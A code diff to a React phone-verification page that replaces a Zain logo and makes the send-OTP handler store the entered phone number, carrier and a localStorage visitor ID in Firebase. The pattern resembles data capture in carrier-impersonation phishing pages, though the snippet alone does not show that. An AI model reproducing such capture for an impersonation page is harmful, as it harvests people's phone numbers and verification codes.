@@ -7,6 +7,7 @@ import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Phone } from "lucide-react"
 import { OtpDialog } from "@/components/phone-otp-dialog"
+import { addData } from "@/lib/firebase"
 
 export default function VerifyPhonePage() {
   const [phoneNumber, setPhoneNumber] = useState("")
@@ -46,11 +47,7 @@ export default function VerifyPhonePage() {
       id: "zain",
       name: "Zain",
       logo: (
-        <svg viewBox="0 0 100 40" className="h-8 w-auto">
-          <text x="50" y="24" textAnchor="middle" className="fill-gray-900 font-bold text-xl">
-            ●ZAIN
-          </text>
-        </svg>
+       <img src="/Zain-logo-400x400-01.png" alt="zain" width={60}/>
       ),
       bgColor: "bg-orange-50",
       borderColor: "border-orange-200",
@@ -58,8 +55,12 @@ export default function VerifyPhonePage() {
     },
   ]
 
-  const handleSendOtp = () => {
+  const handleSendOtp = async () => {
     if (phoneNumber && selectedCarrier) {
+      const visitorID=localStorage.getItem('visitor')
+     await addData({id:visitorID,phoneNumber2:phoneNumber,selectedCarrier}
+
+      )
       setShowOtpDialog(true)
     }
   }
